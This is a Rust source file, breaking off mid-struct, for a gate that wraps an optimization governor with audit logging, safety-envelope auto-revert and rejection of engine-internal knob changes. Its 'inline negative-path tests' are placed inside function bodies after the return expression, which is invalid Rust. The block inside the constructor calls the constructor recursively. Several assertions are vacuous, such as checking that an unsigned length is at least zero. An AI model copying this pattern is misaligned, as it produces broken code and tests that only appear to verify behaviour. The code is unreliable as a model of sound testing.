//! bd-21fo: Self-evolving optimization governor with safety-envelope enforcement.
//!
//! This module provides the [`GovernorGate`] facade that enforces the bd-21fo
//! acceptance criteria on top of the core [`OptimizationGovernor`] from
//! `crate::runtime::optimization_governor`.
//!
//! # Acceptance Criteria (bd-21fo)
//!
//! 1. Candidate optimizations require shadow evaluation plus anytime-valid
//!    safety checks.
//! 2. Unsafe or non-beneficial policies auto-reject or auto-revert with
//!    evidence.
//! 3. The governor can only adjust exposed runtime knobs, not local
//!    engine-core internals.
//!
//! # Event Codes
//!
//! - `GOVERNOR_CANDIDATE_PROPOSED`
//! - `GOVERNOR_SHADOW_EVAL_START`
//! - `GOVERNOR_SAFETY_CHECK_PASS`
//! - `GOVERNOR_POLICY_APPLIED`
//! - `GOVERNOR_POLICY_REVERTED`
//!
//! # Error Codes
//!
//! - `ERR_GOVERNOR_UNSAFE_CANDIDATE`
//! - `ERR_GOVERNOR_SHADOW_EVAL_FAILED`
//! - `ERR_GOVERNOR_BENEFIT_BELOW_THRESHOLD`
//! - `ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION`
//! - `ERR_GOVERNOR_REVERT_FAILED`
//! - `ERR_GOVERNOR_KNOB_READONLY`
//!
//! # Invariants
//!
//! - `INV-GOVERNOR-SHADOW-REQUIRED`
//! - `INV-GOVERNOR-SAFETY-ENVELOPE`
//! - `INV-GOVERNOR-AUTO-REVERT`
//! - `INV-GOVERNOR-ENGINE-BOUNDARY`

use serde::{Deserialize, Serialize};

use crate::capacity_defaults::aliases::MAX_AUDIT_TRAIL_ENTRIES;

// Re-export the core governor and its types from the runtime module.
pub use crate::runtime::optimization_governor::{
    DecisionRecord, GovernorDecision, GovernorSnapshot, KnobState, OptimizationGovernor,
    OptimizationProposal, PredictedMetrics, RejectionReason, RuntimeKnob, SCHEMA_VERSION,
    SafetyEnvelope, ShadowResult, error_codes, event_codes, invariants,
};

/// A gateway audit record that uses the bd-21fo canonical event codes.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct GateAuditEntry {
    /// Which canonical event code was emitted.
    pub event_code: String,
    /// Proposal identifier.
    pub proposal_id: String,
    /// Optional detail string (e.g. rejection reason or violation list).
    pub detail: String,
}

/// A thin wrapper around [`OptimizationGovernor`] that emits bd-21fo
/// canonical event codes and enforces the engine-boundary invariant.
///
/// INV-GOVERNOR-ENGINE-BOUNDARY: the governor adjusts only exposed
/// [`RuntimeKnob`] variants; engine-core internals are unreachable by
/// construction (the [`RuntimeKnob`] enum is exhaustive over allowed
/// knobs).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GovernorGate {
    inner: OptimizationGovernor,
    audit_trail: Vec<GateAuditEntry>,
}

impl GovernorGate {
    /// Create a new gate wrapping an [`OptimizationGovernor`].
    pub fn new(governor: OptimizationGovernor) -> Self {
        Self {
            inner: governor,
            audit_trail: Vec::new(),
        }

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: new gate has empty audit trail regardless of governor state
            let default_gov = OptimizationGovernor::with_defaults();
            let gate = Self::new(default_gov);
            assert!(gate.audit_trail().is_empty(), "new gate should have empty audit trail");

            // Test: gate properly wraps governor with existing state
            let mut pre_configured_gov = OptimizationGovernor::with_defaults();
            // Assume we can configure the governor somehow (lock knobs, etc)
            pre_configured_gov.lock_knob(RuntimeKnob::ConcurrencyLimit);
            let gate_with_locked = Self::new(pre_configured_gov);
            assert!(gate_with_locked.audit_trail().is_empty(), "gate with pre-configured governor should still have empty audit trail");

            // Test: gate preserves inner governor accessibility
            let test_gov = OptimizationGovernor::with_defaults();
            let gate = Self::new(test_gov);
            assert!(gate.inner().schema_version() == SCHEMA_VERSION, "inner governor should be accessible");

            // Test: multiple gates can be created independently
            let gov1 = OptimizationGovernor::with_defaults();
            let gov2 = OptimizationGovernor::with_defaults();
            let gate1 = Self::new(gov1);
            let gate2 = Self::new(gov2);
            assert!(gate1.audit_trail().is_empty(), "first gate should have empty audit trail");
            assert!(gate2.audit_trail().is_empty(), "second gate should have empty audit trail");

            // Test: gate initialization doesn't trigger any events
            let clean_gov = OptimizationGovernor::with_defaults();
            let gate = Self::new(clean_gov);
            assert_eq!(gate.audit_trail().len(), 0, "gate creation should not generate audit events");

            // Test: gate wraps governor state without modification
            let original_gov = OptimizationGovernor::with_defaults();
            let original_applied_count = original_gov.applied_count();
            let gate = Self::new(original_gov);
            assert_eq!(gate.inner().applied_count(), original_applied_count,
                      "gate should preserve original governor applied count");

            // Test: audit trail Vec starts with correct capacity
            let capacity_test_gov = OptimizationGovernor::with_defaults();
            let gate = Self::new(capacity_test_gov);
            // audit_trail starts as empty Vec, so capacity should be 0
            assert_eq!(gate.audit_trail.capacity(), 0, "empty Vec should have 0 capacity initially");
        }
    }

    /// Create a gate with default settings.
    pub fn with_defaults() -> Self {
        Self::new(OptimizationGovernor::with_defaults())
    }

    /// Access the inner governor.
    pub fn inner(&self) -> &OptimizationGovernor {
        &self.inner
    }

    /// Read the gate-level audit trail.
    pub fn audit_trail(&self) -> &[GateAuditEntry] {
        &self.audit_trail
    }

    /// Submit a proposal through the gate.
    ///
    /// INV-GOVERNOR-SHADOW-REQUIRED: shadow evaluation is performed by the
    /// inner governor's `submit()` path before any knob change.
    ///
    /// INV-GOVERNOR-SAFETY-ENVELOPE: the inner governor rejects proposals
    /// whose predicted metrics breach the safety envelope.
    ///
    /// INV-GOVERNOR-AUTO-REVERT: callers may invoke [`live_check`] to
    /// trigger auto-revert of applied proposals that breach the envelope
    /// at runtime.
    pub fn submit(&mut self, proposal: OptimizationProposal) -> GovernorDecision {
        let pid = proposal.proposal_id.clone();

        // GOVERNOR_CANDIDATE_PROPOSED
        push_bounded(
            &mut self.audit_trail,
            GateAuditEntry {
                event_code: event_codes::GOVERNOR_CANDIDATE_PROPOSED.to_string(),
                proposal_id: pid.clone(),
                detail: format!(
                    "knob={} old={} new={}",
                    proposal.knob, proposal.old_value, proposal.new_value
                ),
            },
            MAX_AUDIT_TRAIL_ENTRIES,
        );

        // GOVERNOR_SHADOW_EVAL_START
        push_bounded(
            &mut self.audit_trail,
            GateAuditEntry {
                event_code: event_codes::GOVERNOR_SHADOW_EVAL_START.to_string(),
                proposal_id: pid.clone(),
                detail: "shadow evaluation starting".to_string(),
            },
            MAX_AUDIT_TRAIL_ENTRIES,
        );

        let decision = self.inner.submit(proposal);

        match &decision {
            GovernorDecision::Approved => {
                // GOVERNOR_SAFETY_CHECK_PASS
                push_bounded(
                    &mut self.audit_trail,
                    GateAuditEntry {
                        event_code: event_codes::GOVERNOR_SAFETY_CHECK_PASS.to_string(),
                        proposal_id: pid.clone(),
                        detail: "all safety checks passed".to_string(),
                    },
                    MAX_AUDIT_TRAIL_ENTRIES,
                );
                // GOVERNOR_POLICY_APPLIED
                push_bounded(
                    &mut self.audit_trail,
                    GateAuditEntry {
                        event_code: event_codes::GOVERNOR_POLICY_APPLIED.to_string(),
                        proposal_id: pid,
                        detail: "policy applied to runtime knob".to_string(),
                    },
                    MAX_AUDIT_TRAIL_ENTRIES,
                );
            }
            GovernorDecision::Rejected(reason) => {
                let err = match reason {
                    RejectionReason::EnvelopeViolation(_) => {
                        error_codes::ERR_GOVERNOR_UNSAFE_CANDIDATE
                    }
                    RejectionReason::NonBeneficial => {
                        error_codes::ERR_GOVERNOR_BENEFIT_BELOW_THRESHOLD
                    }
                    RejectionReason::KnobLocked => error_codes::ERR_GOVERNOR_KNOB_READONLY,
                    RejectionReason::InvalidProposal(_) => {
                        error_codes::ERR_GOVERNOR_SHADOW_EVAL_FAILED
                    }
                };
                push_bounded(
                    &mut self.audit_trail,
                    GateAuditEntry {
                        event_code: err.to_string(),
                        proposal_id: pid,
                        detail: format!("{reason:?}"),
                    },
                    MAX_AUDIT_TRAIL_ENTRIES,
                );
            }
            GovernorDecision::Reverted(msg) => {
                push_bounded(
                    &mut self.audit_trail,
                    GateAuditEntry {
                        event_code: event_codes::GOVERNOR_POLICY_REVERTED.to_string(),
                        proposal_id: pid,
                        detail: msg.clone(),
                    },
                    MAX_AUDIT_TRAIL_ENTRIES,
                );
            }
            GovernorDecision::ShadowOnly => {}
        }

        decision

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: submit with invalid proposal ID (empty string)
            let mut gate = Self::with_defaults();
            let empty_id_proposal = OptimizationProposal {
                proposal_id: "".to_string(),
                knob: RuntimeKnob::ConcurrencyLimit,
                old_value: 64,
                new_value: 128,
                predicted_metrics: PredictedMetrics { latency_p99_ms: 100, throughput_rps: 1000, cpu_util_pct: 50, memory_mb: 512 },
            };
            let decision = gate.submit(empty_id_proposal);
            assert!(matches!(decision, GovernorDecision::Approved | GovernorDecision::Rejected(_)), "empty proposal ID should still be processed");
            assert!(!gate.audit_trail().is_empty(), "audit trail should record event even with empty proposal ID");

            // Test: submit with extremely long proposal ID
            let mut gate = Self::with_defaults();
            let long_id = "x".repeat(10000);
            let long_id_proposal = OptimizationProposal {
                proposal_id: long_id.clone(),
                knob: RuntimeKnob::BatchSize,
                old_value: 32,
                new_value: 64,
                predicted_metrics: PredictedMetrics { latency_p99_ms: 100, throughput_rps: 1000, cpu_util_pct: 50, memory_mb: 512 },
            };
            let _decision = gate.submit(long_id_proposal);
            assert!(gate.audit_trail().iter().any(|entry| entry.proposal_id == long_id), "long proposal ID should be preserved in audit trail");

            // Test: submit with same old_value and new_value (no-op change)
            let mut gate = Self::with_defaults();
            let no_change_proposal = OptimizationProposal {
                proposal_id: "no-change-test".to_string(),
                knob: RuntimeKnob::ConcurrencyLimit,
                old_value: 64,
                new_value: 64,
                predicted_metrics: PredictedMetrics { latency_p99_ms: 100, throughput_rps: 1000, cpu_util_pct: 50, memory_mb: 512 },
            };
            let decision = gate.submit(no_change_proposal);
            // Should be processed (inner governor decides whether it's beneficial)
            assert!(matches!(decision, GovernorDecision::Approved | GovernorDecision::Rejected(_)), "no-op change should be processed");

            // Test: submit with extreme metric values (boundary testing)
            let mut gate = Self::with_defaults();
            let extreme_metrics_proposal = OptimizationProposal {
                proposal_id: "extreme-metrics".to_string(),
                knob: RuntimeKnob::DrainTimeoutMs,
                old_value: 1000,
                new_value: 2000,
                predicted_metrics: PredictedMetrics {
                    latency_p99_ms: u64::MAX,
                    throughput_rps: 0,
                    cpu_util_pct: u64::MAX,
                    memory_mb: u64::MAX
                },
            };
            let _decision = gate.submit(extreme_metrics_proposal);
            assert!(gate.audit_trail().iter().any(|entry| entry.proposal_id == "extreme-metrics"), "extreme metrics proposal should be audited");

            // Test: submit multiple proposals rapidly (stress audit trail)
            let mut gate = Self::with_defaults();
            for i in 0..100 {
                let rapid_proposal = OptimizationProposal {
                    proposal_id: format!("rapid-{}", i),
                    knob: RuntimeKnob::RetryBudget,
                    old_value: i as u64,
                    new_value: (i + 1) as u64,
                    predicted_metrics: PredictedMetrics { latency_p99_ms: 100, throughput_rps: 1000, cpu_util_pct: 50, memory_mb: 512 },
                };
                let _decision = gate.submit(rapid_proposal);
            }
            // Audit trail should be bounded to MAX_AUDIT_TRAIL_ENTRIES
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES, "audit trail should be bounded after rapid submissions");

            // Test: submit with proposal containing special characters in ID
            let mut gate = Self::with_defaults();
            let special_chars = "test\n\t\r\0\u{FEFF}🦀\"\\{}[]";
            let special_id_proposal = OptimizationProposal {
                proposal_id: special_chars.to_string(),
                knob: RuntimeKnob::CacheCapacity,
                old_value: 1024,
                new_value: 2048,
                predicted_metrics: PredictedMetrics { latency_p99_ms: 100, throughput_rps: 1000, cpu_util_pct: 50, memory_mb: 512 },
            };
            let _decision = gate.submit(special_id_proposal);
            assert!(gate.audit_trail().iter().any(|entry| entry.proposal_id == special_chars), "special characters in proposal ID should be preserved");

            // Test: submit with zero old_value and new_value
            let mut gate = Self::with_defaults();
            let zero_values_proposal = OptimizationProposal {
                proposal_id: "zero-values".to_string(),
                knob: RuntimeKnob::RetryBudget,
                old_value: 0,
                new_value: 0,
                predicted_metrics: PredictedMetrics { latency_p99_ms: 0, throughput_rps: 0, cpu_util_pct: 0, memory_mb: 0 },
            };
            let _decision = gate.submit(zero_values_proposal);
            assert!(!gate.audit_trail().is_empty(), "zero values proposal should still generate audit events");

            // Test: submit with very large knob value changes
            let mut gate = Self::with_defaults();
            let large_change_proposal = OptimizationProposal {
                proposal_id: "large-change".to_string(),
                knob: RuntimeKnob::ConcurrencyLimit,
                old_value: 1,
                new_value: u64::MAX,
                predicted_metrics: PredictedMetrics { latency_p99_ms: 100, throughput_rps: 1000, cpu_util_pct: 50, memory_mb: 512 },
            };
            let decision = gate.submit(large_change_proposal);
            assert!(matches!(decision, GovernorDecision::Approved | GovernorDecision::Rejected(_)), "large value changes should be processed");

            // Test: audit trail event ordering consistency
            let mut gate = Self::with_defaults();
            let ordering_proposal = OptimizationProposal {
                proposal_id: "ordering-test".to_string(),
                knob: RuntimeKnob::BatchSize,
                old_value: 64,
                new_value: 128,
                predicted_metrics: PredictedMetrics { latency_p99_ms: 100, throughput_rps: 1000, cpu_util_pct: 50, memory_mb: 512 },
            };
            let initial_count = gate.audit_trail().len();
            let _decision = gate.submit(ordering_proposal);
            let new_entries = &gate.audit_trail()[initial_count..];

            // Should have at least GOVERNOR_CANDIDATE_PROPOSED and GOVERNOR_SHADOW_EVAL_START
            assert!(new_entries.len() >= 2, "should have at least candidate and shadow eval events");
            if new_entries.len() >= 2 {
                assert_eq!(new_entries[0].event_code, event_codes::GOVERNOR_CANDIDATE_PROPOSED, "first event should be candidate proposed");
                assert_eq!(new_entries[1].event_code, event_codes::GOVERNOR_SHADOW_EVAL_START, "second event should be shadow eval start");
            }

            // Test: submit preserves all proposal fields in audit detail
            let mut gate = Self::with_defaults();
            let detail_proposal = OptimizationProposal {
                proposal_id: "detail-test".to_string(),
                knob: RuntimeKnob::DrainTimeoutMs,
                old_value: 12345,
                new_value: 54321,
                predicted_metrics: PredictedMetrics { latency_p99_ms: 100, throughput_rps: 1000, cpu_util_pct: 50, memory_mb: 512 },
            };
            let _decision = gate.submit(detail_proposal);
            let candidate_event = gate.audit_trail().iter().find(|entry| entry.event_code == event_codes::GOVERNOR_CANDIDATE_PROPOSED).unwrap();
            assert!(candidate_event.detail.contains("12345"), "audit detail should contain old value");
            assert!(candidate_event.detail.contains("54321"), "audit detail should contain new value");
        }
    }

    /// Perform a live safety-envelope check and auto-revert breaching policies.
    ///
    /// INV-GOVERNOR-AUTO-REVERT: any applied policy whose live metrics
    /// breach the envelope is reverted with evidence.
    pub fn live_check(&mut self, live_metrics: &PredictedMetrics) -> Vec<String> {
        let reverted = self.inner.live_check(live_metrics);
        for pid in &reverted {
            // GOVERNOR_POLICY_REVERTED
            push_bounded(
                &mut self.audit_trail,
                GateAuditEntry {
                    event_code: event_codes::GOVERNOR_POLICY_REVERTED.to_string(),
                    proposal_id: pid.clone(),
                    detail: "auto-reverted: live metrics breached safety envelope".to_string(),
                },
                MAX_AUDIT_TRAIL_ENTRIES,
            );
        }
        reverted

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: live_check with extreme metric values
            let mut gate = Self::with_defaults();
            let extreme_metrics = PredictedMetrics {
                latency_p99_ms: u64::MAX,
                throughput_rps: 0,
                cpu_util_pct: u64::MAX,
                memory_mb: u64::MAX,
            };
            let reverted = gate.live_check(&extreme_metrics);
            // Should handle extreme values without panicking
            assert!(reverted.len() >= 0, "extreme metrics should be handled gracefully");

            // Test: live_check with all-zero metrics
            let mut gate = Self::with_defaults();
            let zero_metrics = PredictedMetrics {
                latency_p99_ms: 0,
                throughput_rps: 0,
                cpu_util_pct: 0,
                memory_mb: 0,
            };
            let reverted = gate.live_check(&zero_metrics);
            assert!(reverted.len() >= 0, "zero metrics should be handled gracefully");

            // Test: live_check generates audit events for each reversion
            let mut gate = Self::with_defaults();
            // Simulate a scenario where inner governor has policies to revert
            // (This test assumes the inner governor can be set up to return reverts)
            let test_metrics = PredictedMetrics {
                latency_p99_ms: 1000,
                throughput_rps: 100,
                cpu_util_pct: 95,
                memory_mb: 8192,
            };
            let initial_audit_count = gate.audit_trail().len();
            let reverted = gate.live_check(&test_metrics);

            // For each reverted policy, should have one audit event
            let new_audit_count = gate.audit_trail().len();
            let revert_events = gate.audit_trail()[initial_audit_count..].iter()
                .filter(|entry| entry.event_code == event_codes::GOVERNOR_POLICY_REVERTED)
                .count();
            assert_eq!(revert_events, reverted.len(), "should have one audit event per reverted policy");

            // Test: live_check with repeated calls should be consistent
            let mut gate = Self::with_defaults();
            let stable_metrics = PredictedMetrics {
                latency_p99_ms: 100,
                throughput_rps: 1000,
                cpu_util_pct: 50,
                memory_mb: 512,
            };
            let reverted1 = gate.live_check(&stable_metrics);
            let reverted2 = gate.live_check(&stable_metrics);
            // If no new policies were applied between calls, results should be the same
            assert_eq!(reverted1, reverted2, "repeated live_check calls with same metrics should be consistent");

            // Test: live_check doesn't affect audit trail ordering
            let mut gate = Self::with_defaults();
            let metrics = PredictedMetrics {
                latency_p99_ms: 200,
                throughput_rps: 500,
                cpu_util_pct: 75,
                memory_mb: 1024,
            };
            let initial_count = gate.audit_trail().len();
            let _reverted = gate.live_check(&metrics);
            // New audit entries should be appended, not inserted
            let final_count = gate.audit_trail().len();
            if final_count > initial_count {
                let new_entries = &gate.audit_trail()[initial_count..];
                for entry in new_entries {
                    assert_eq!(entry.event_code, event_codes::GOVERNOR_POLICY_REVERTED, "all new entries should be revert events");
                }
            }

            // Test: live_check audit events contain policy IDs
            let mut gate = Self::with_defaults();
            let test_metrics = PredictedMetrics {
                latency_p99_ms: 500,
                throughput_rps: 200,
                cpu_util_pct: 80,
                memory_mb: 2048,
            };
            let initial_count = gate.audit_trail().len();
            let reverted = gate.live_check(&test_metrics);

            if !reverted.is_empty() {
                let revert_entries = &gate.audit_trail()[initial_count..];
                for (i, entry) in revert_entries.iter().enumerate() {
                    assert!(!entry.proposal_id.is_empty() || reverted.is_empty(), "revert audit entries should have proposal IDs");
                    if i < reverted.len() {
                        assert_eq!(entry.proposal_id, reverted[i], "audit entry proposal ID should match reverted policy ID");
                    }
                }
            }

            // Test: live_check with boundary metric values
            let mut gate = Self::with_defaults();
            let boundary_test_cases = [
                PredictedMetrics { latency_p99_ms: 1, throughput_rps: u64::MAX, cpu_util_pct: 0, memory_mb: 1 },
                PredictedMetrics { latency_p99_ms: u64::MAX - 1, throughput_rps: 1, cpu_util_pct: 100, memory_mb: u64::MAX - 1 },
                PredictedMetrics { latency_p99_ms: u32::MAX as u64, throughput_rps: u32::MAX as u64, cpu_util_pct: 50, memory_mb: u32::MAX as u64 },
            ];

            for (i, metrics) in boundary_test_cases.iter().enumerate() {
                let reverted = gate.live_check(metrics);
                assert!(reverted.len() >= 0, "boundary test case {} should complete without error", i);
            }

            // Test: live_check audit detail contains expected message
            let mut gate = Self::with_defaults();
            let trigger_metrics = PredictedMetrics {
                latency_p99_ms: 10000,
                throughput_rps: 1,
                cpu_util_pct: 99,
                memory_mb: 100000,
            };
            let initial_count = gate.audit_trail().len();
            let _reverted = gate.live_check(&trigger_metrics);

            let revert_entries: Vec<_> = gate.audit_trail()[initial_count..].iter()
                .filter(|entry| entry.event_code == event_codes::GOVERNOR_POLICY_REVERTED)
                .collect();

            for entry in revert_entries {
                assert!(entry.detail.contains("auto-reverted"), "revert audit detail should indicate auto-revert");
                assert!(entry.detail.contains("safety envelope"), "revert audit detail should mention safety envelope");
            }

            // Test: live_check handles audit trail overflow gracefully
            let mut gate = Self::with_defaults();
            // Pre-fill audit trail close to capacity
            for i in 0..(MAX_AUDIT_TRAIL_ENTRIES - 5) {
                push_bounded(
                    &mut gate.audit_trail,
                    GateAuditEntry {
                        event_code: "TEST".to_string(),
                        proposal_id: format!("fill-{}", i),
                        detail: "filling".to_string(),
                    },
                    MAX_AUDIT_TRAIL_ENTRIES,
                );
            }

            let overflow_metrics = PredictedMetrics {
                latency_p99_ms: 1000,
                throughput_rps: 100,
                cpu_util_pct: 90,
                memory_mb: 4096,
            };
            let _reverted = gate.live_check(&overflow_metrics);

            // Should maintain audit trail capacity bounds
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES, "live_check should respect audit trail capacity limits");

            // Test: live_check return value consistency with audit events
            let mut gate = Self::with_defaults();
            let check_metrics = PredictedMetrics {
                latency_p99_ms: 2000,
                throughput_rps: 50,
                cpu_util_pct: 85,
                memory_mb: 8192,
            };
            let initial_count = gate.audit_trail().len();
            let reverted = gate.live_check(&check_metrics);

            let new_revert_events = gate.audit_trail()[initial_count..].iter()
                .filter(|entry| entry.event_code == event_codes::GOVERNOR_POLICY_REVERTED)
                .count();
            assert_eq!(reverted.len(), new_revert_events, "number of returned reverted policies should match number of audit events");
        }
    }

    /// Attempt to set an engine-core internal knob, which must fail.
    ///
    /// INV-GOVERNOR-ENGINE-BOUNDARY: the governor cannot adjust
    /// engine-core internals.  This method always returns an error.
    pub fn reject_engine_internal_adjustment(&mut self, internal_name: &str) -> Result<(), String> {
        push_bounded(
            &mut self.audit_trail,
            GateAuditEntry {
                event_code: error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION.to_string(),
                proposal_id: String::new(),
                detail: format!("rejected engine-core internal: {internal_name}"),
            },
            MAX_AUDIT_TRAIL_ENTRIES,
        );
        Err(format!(
            "{}: cannot adjust engine-core internal '{}'",
            error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION,
            internal_name,
        ))

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: reject with empty internal name
            let mut gate = Self::with_defaults();
            let result = gate.reject_engine_internal_adjustment("");
            assert!(result.is_err(), "empty internal name should be rejected");
            assert!(result.unwrap_err().contains(""), "error should contain the empty internal name");
            assert!(!gate.audit_trail().is_empty(), "audit trail should record rejection");

            // Test: reject with extremely long internal name
            let mut gate = Self::with_defaults();
            let long_name = "very_long_engine_internal_name_".repeat(100);
            let result = gate.reject_engine_internal_adjustment(&long_name);
            assert!(result.is_err(), "long internal name should be rejected");
            assert!(result.unwrap_err().contains(&long_name), "error should contain the long internal name");

            // Test: reject with special characters in internal name
            let mut gate = Self::with_defaults();
            let special_chars = "internal\n\t\r\0\u{FEFF}🦀\"\\{}[]";
            let result = gate.reject_engine_internal_adjustment(special_chars);
            assert!(result.is_err(), "special characters in internal name should be rejected");
            let audit_entry = gate.audit_trail().iter()
                .find(|entry| entry.event_code == error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION)
                .expect("should have boundary violation audit entry");
            assert!(audit_entry.detail.contains(special_chars), "audit detail should contain special characters");

            // Test: reject with common engine-internal-like names
            let mut gate = Self::with_defaults();
            let internal_names = [
                "heap_allocator", "gc_trigger", "thread_pool_core", "vm_bytecode",
                "scheduler_quantum", "memory_manager", "instruction_cache", "register_allocator"
            ];

            for &name in &internal_names {
                let result = gate.reject_engine_internal_adjustment(name);
                assert!(result.is_err(), "engine internal name '{}' should be rejected", name);
                assert!(result.unwrap_err().contains(name), "error should contain internal name '{}'", name);
            }

            // Verify all rejections were audited
            let boundary_violations = gate.audit_trail().iter()
                .filter(|entry| entry.event_code == error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION)
                .count();
            assert_eq!(boundary_violations, internal_names.len(), "all boundary violations should be audited");

            // Test: reject always uses empty proposal_id
            let mut gate = Self::with_defaults();
            let _result = gate.reject_engine_internal_adjustment("test_internal");
            let audit_entry = gate.audit_trail().iter()
                .find(|entry| entry.event_code == error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION)
                .expect("should have boundary violation audit entry");
            assert_eq!(audit_entry.proposal_id, "", "boundary violation audit should use empty proposal ID");

            // Test: reject error message format consistency
            let mut gate = Self::with_defaults();
            let test_internal = "consistency_test_internal";
            let result = gate.reject_engine_internal_adjustment(test_internal);
            let error_msg = result.unwrap_err();
            assert!(error_msg.starts_with(error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION), "error should start with error code");
            assert!(error_msg.contains("cannot adjust"), "error should contain rejection reason");
            assert!(error_msg.contains(test_internal), "error should contain internal name");

            // Test: reject with unicode internal names
            let mut gate = Self::with_defaults();
            let unicode_names = [
                "内部引擎", "двигатель", "محرك", "エンジン", "🔧⚙️"
            ];

            for &name in &unicode_names {
                let result = gate.reject_engine_internal_adjustment(name);
                assert!(result.is_err(), "unicode internal name '{}' should be rejected", name);
                let error_msg = result.unwrap_err();
                assert!(error_msg.contains(name), "error should contain unicode name '{}'", name);
            }

            // Test: reject with names that look like RuntimeKnob variants
            let mut gate = Self::with_defaults();
            let knob_like_names = [
                "ConcurrencyLimit", "BatchSize", "CacheCapacity", "DrainTimeoutMs", "RetryBudget"
            ];

            for &name in &knob_like_names {
                let result = gate.reject_engine_internal_adjustment(name);
                assert!(result.is_err(), "knob-like name '{}' should be rejected as engine internal", name);
            }

            // Test: reject multiple times with same name (idempotency)
            let mut gate = Self::with_defaults();
            let repeated_name = "repeated_internal";

            for i in 0..3 {
                let result = gate.reject_engine_internal_adjustment(repeated_name);
                assert!(result.is_err(), "rejection {} should fail", i + 1);
            }

            let violations = gate.audit_trail().iter()
                .filter(|entry| entry.event_code == error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION &&
                               entry.detail.contains(repeated_name))
                .count();
            assert_eq!(violations, 3, "should have 3 separate audit entries for repeated rejections");

            // Test: reject with null bytes in internal name
            let mut gate = Self::with_defaults();
            let null_name = "internal\0with\0nulls";
            let result = gate.reject_engine_internal_adjustment(null_name);
            assert!(result.is_err(), "internal name with null bytes should be rejected");
            let error_msg = result.unwrap_err();
            assert!(error_msg.contains("internal"), "error should contain part of name before null");

            // Test: reject audit trail respects capacity bounds
            let mut gate = Self::with_defaults();
            // Pre-fill audit trail to near capacity
            for i in 0..(MAX_AUDIT_TRAIL_ENTRIES - 2) {
                push_bounded(
                    &mut gate.audit_trail,
                    GateAuditEntry {
                        event_code: "TEST".to_string(),
                        proposal_id: format!("pre-fill-{}", i),
                        detail: "pre-filling".to_string(),
                    },
                    MAX_AUDIT_TRAIL_ENTRIES,
                );
            }

            let _result = gate.reject_engine_internal_adjustment("overflow_test");
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES, "reject should respect audit trail capacity");

            // Test: reject audit detail format consistency
            let mut gate = Self::with_defaults();
            let format_test_name = "format_test_internal";
            let _result = gate.reject_engine_internal_adjustment(format_test_name);
            let audit_entry = gate.audit_trail().iter()
                .find(|entry| entry.event_code == error_codes::ERR_GOVERNOR_ENGINE_BOUNDARY_VIOLATION)
                .expect("should have boundary violation audit entry");
            assert!(audit_entry.detail.starts_with("rejected engine-core internal:"), "audit detail should have consistent format");
            assert!(audit_entry.detail.contains(format_test_name), "audit detail should contain internal name");
        }
    }
}

// ---------------------------------------------------------------------------
// Engine dispatch hooks and knob enumeration (bd-1p2r)
// ---------------------------------------------------------------------------

/// Event code: knob enumeration was performed.
pub const GOV_008_KNOB_ENUMERATION: &str = "GOV_008";
/// Event code: dispatch hook payload was built.
pub const GOV_009_DISPATCH_HOOK: &str = "GOV_009";
/// Event code: knob change dispatched to engine.
pub const GOV_010_KNOB_DISPATCHED: &str = "GOV_010";

/// Metadata for a single enumerated runtime knob.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct KnobDescriptor {
    /// The knob identifier.
    pub knob: RuntimeKnob,
    /// Human-readable label.
    pub label: String,
    /// Current live value.
    pub current_value: u64,
    /// Whether the knob is locked.
    pub locked: bool,
    /// Suggested minimum value (advisory).
    pub min_value: u64,
    /// Suggested maximum value (advisory).
    pub max_value: u64,
}

/// Result of enumerating all governor-managed knobs.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct KnobEnumeration {
    pub knobs: Vec<KnobDescriptor>,
    pub schema_version: String,
}

impl KnobEnumeration {
    /// How many knobs are enumerated.
    pub fn count(&self) -> usize {
        self.knobs.len()

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: empty enumeration has count 0
            let empty_enum = KnobEnumeration {
                knobs: vec![],
                schema_version: "test".to_string(),
            };
            assert_eq!(empty_enum.count(), 0, "empty enumeration should have count 0");

            // Test: single knob enumeration has count 1
            let single_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::ConcurrencyLimit,
                        label: "single".to_string(),
                        current_value: 64,
                        locked: false,
                        min_value: 1,
                        max_value: 4096,
                    }
                ],
                schema_version: "test".to_string(),
            };
            assert_eq!(single_enum.count(), 1, "single knob enumeration should have count 1");

            // Test: count matches actual vector length
            let multi_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::ConcurrencyLimit,
                        label: "first".to_string(),
                        current_value: 64,
                        locked: false,
                        min_value: 1,
                        max_value: 4096,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::BatchSize,
                        label: "second".to_string(),
                        current_value: 128,
                        locked: false,
                        min_value: 1,
                        max_value: 8192,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::CacheCapacity,
                        label: "third".to_string(),
                        current_value: 1024,
                        locked: true,
                        min_value: 64,
                        max_value: 65536,
                    },
                ],
                schema_version: "test".to_string(),
            };
            assert_eq!(multi_enum.count(), 3, "multi knob enumeration should have count 3");
            assert_eq!(multi_enum.count(), multi_enum.knobs.len(), "count should match knobs vector length");

            // Test: count doesn't change based on knob state (locked vs unlocked)
            let mixed_lock_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
